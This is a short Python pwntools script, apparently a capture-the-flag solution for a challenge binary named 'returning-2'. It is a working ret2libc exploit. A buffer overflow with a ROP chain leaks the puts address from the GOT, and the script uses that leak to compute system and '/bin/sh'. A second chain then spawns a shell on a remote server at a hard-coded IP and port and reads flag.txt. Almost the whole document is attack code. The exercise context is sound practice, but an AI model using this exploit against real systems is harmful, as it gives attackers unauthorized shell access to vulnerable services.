#!/usr/bin/env python3
import pwn

system_offset = 0x7ffff7a31550 - 0x7ffff7a62aa0
bin_sh_offset = 0x7ffff7b95e1a - 0x7ffff7a62aa0

main     = 0x4007a8
ret = 0x400780
puts_plt = 0x4005b0
puts_got = 0x601018
pop_rdi = 0x40077f
pop_rdx = 0x400784
pop_rsi = 0x40078d
pop_rax = 0x400796

#p = pwn.process('returning-2')
p = pwn.remote('34.121.211.139', 3333)
#pwn.gdb.attach(p)

if True:
    p.readuntil('input:')
    p.sendline('1')
    p.readuntil('\n')
    payload  = b"A"*40
    payload += pwn.p64(pop_rdi)
    payload += pwn.p64(puts_got)
    payload += pwn.p64(puts_plt)
    payload += pwn.p64(main)
    p.sendline(payload + b'\n')
    p.readline()

    puts = pwn.u64(p.read(6) + b"\x00\x00")
    system = puts + system_offset
    bin_sh = puts + bin_sh_offset

#puts=   0x7f1c456efaa0
#system= 0x7f1c456be550
#bin_sh= 0x7f1c45822e1a

print("puts@   {}".format(hex(puts)))
print("system@ {}".format(hex(system)))
print("/bin/sh {}".format(hex(bin_sh)))

p.readuntil('input:')
p.sendline('1')
p.readuntil('\n')
payload  = b"A"*40
payload += pwn.p64(ret)
payload += pwn.p64(pop_rdi)
payload += pwn.p64(bin_sh)
payload += pwn.p64(system)
payload += pwn.p64(0x42424242)
p.sendline(payload + b'\n')
p.sendline('ls')
p.sendline('cat flag.txt')
p.interactive()
